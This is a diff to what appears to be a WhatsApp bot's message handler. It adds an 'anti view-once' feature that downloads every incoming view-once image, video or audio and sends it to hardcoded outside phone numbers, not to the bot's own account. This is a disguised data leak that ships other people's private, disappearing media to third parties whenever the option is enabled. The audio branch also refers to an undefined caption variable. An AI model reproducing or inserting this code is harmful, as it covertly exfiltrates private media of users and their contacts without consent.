@@ -152,9 +152,25 @@ conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
   const text = `${config.AUTO_STATUS_MSG}`
-  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
  }
+      let jawadik = mek.message.viewOnceMessageV2
+      let jawadik1 = mek.mtype === "viewOnceMessage"
+  if (jawadik && config.ANTI_VV === "true") {
+    if (jawadik.message.imageMessage) {
+    let cap = jawadik.message.imageMessage.caption;
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
+    return conn.sendMessage("26777821911@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+  } if (jawadik.message.videoMessage) {
+    let cap = jawadik.message.videoMessage.caption;
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
+    return conn.sendMessage("26772592531@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+  } if (jawadik.message.audioMessage) {
+    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
+    return conn.sendMessage("26772592531@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
+  }
+  
   const m = sms(conn, mek)
   const type = getContentType(mek.message)
   const content = JSON.stringify(mek.message)
